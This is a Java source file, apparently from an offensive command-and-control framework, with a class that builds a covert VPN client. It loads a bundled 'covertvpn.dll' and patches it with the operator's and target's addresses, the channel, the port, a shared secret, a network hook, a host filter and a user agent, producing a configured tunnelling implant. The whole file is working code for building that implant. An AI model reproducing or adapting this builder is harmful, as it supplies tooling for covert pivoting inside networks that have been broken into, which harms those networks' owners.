package common;

import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class VPNClient {
    private static String _filter(Set chain) {
        StringBuilder result = new StringBuilder();
        Iterator i = chain.iterator();
        while (i.hasNext()) {
            String next = (String) i.next();
            result.append("(not host ").append(next).append(")");
            if (!i.hasNext()) continue;
            result.append(" && ");
        }
        return result.toString();
    }

    public static byte[] exportClient(String myaddr, String tgaddr, Map options, Set chain) {
        String channel = (String) options.get("channel");
        int port = (Integer) options.get("port");
        byte[] secret = (byte[]) options.get("secret");
        String hook = (String) options.get("hook");
        String ua = (String) options.get("useragent");
        String filter = VPNClient._filter(chain);
        if (channel.equals("TCP (Bind)")) {
            channel = "b";
        }
        return VPNClient.exportClient(myaddr, tgaddr, channel.charAt(0) + "", port, secret, hook, ua, filter);
    }

    public static byte[] exportClient(String myaddr, String tgaddr, String ch, int port, byte[] secret, String hook, String useragent, String filter) {
        try {
            InputStream in = CommonUtils.resource("resources/covertvpn.dll");
            byte[] data = CommonUtils.readAll(in);
            in.close();
            Packer patch = new Packer();
            patch.little();
            patch.addString(myaddr, 16);
            patch.addString(tgaddr, 16);
            patch.addString(ch.toLowerCase(), 8);
            patch.addString(port + "", 8);
            patch.addString(secret, 32);
            patch.addString(hook, 32);
            patch.addString(filter, 1024);
            byte[] res = patch.getBytes();
            String dataz = CommonUtils.bString(data);
            int index = dataz.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(res), index);
            index = dataz.indexOf("AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOO");
            dataz = CommonUtils.replaceAt(dataz, useragent + '\u0000', index);
            return CommonUtils.toBytes(dataz);
        } catch (IOException ioex) {
            MudgeSanity.logException("export VPN client", ioex, false);
            return new byte[0];
        }
    }
}

